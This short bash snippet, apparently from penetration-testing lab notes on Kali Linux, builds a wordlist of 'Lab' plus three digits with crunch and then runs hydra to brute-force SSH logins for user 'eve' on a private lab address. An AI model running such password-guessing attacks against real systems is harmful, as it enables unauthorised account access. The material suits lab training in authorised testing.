```bash
kali@kali:~$ crunch 6 6 -t Lab%%% > wordlist
kali@kali:~$ cat wordlist
Lab000
Lab001
Lab002
Lab003
Lab004
Lab005
Lab006
Lab007
Lab008
Lab009
...


hydra -l eve -P wordlist  192.168.0.2 -t 4 ssh -V

```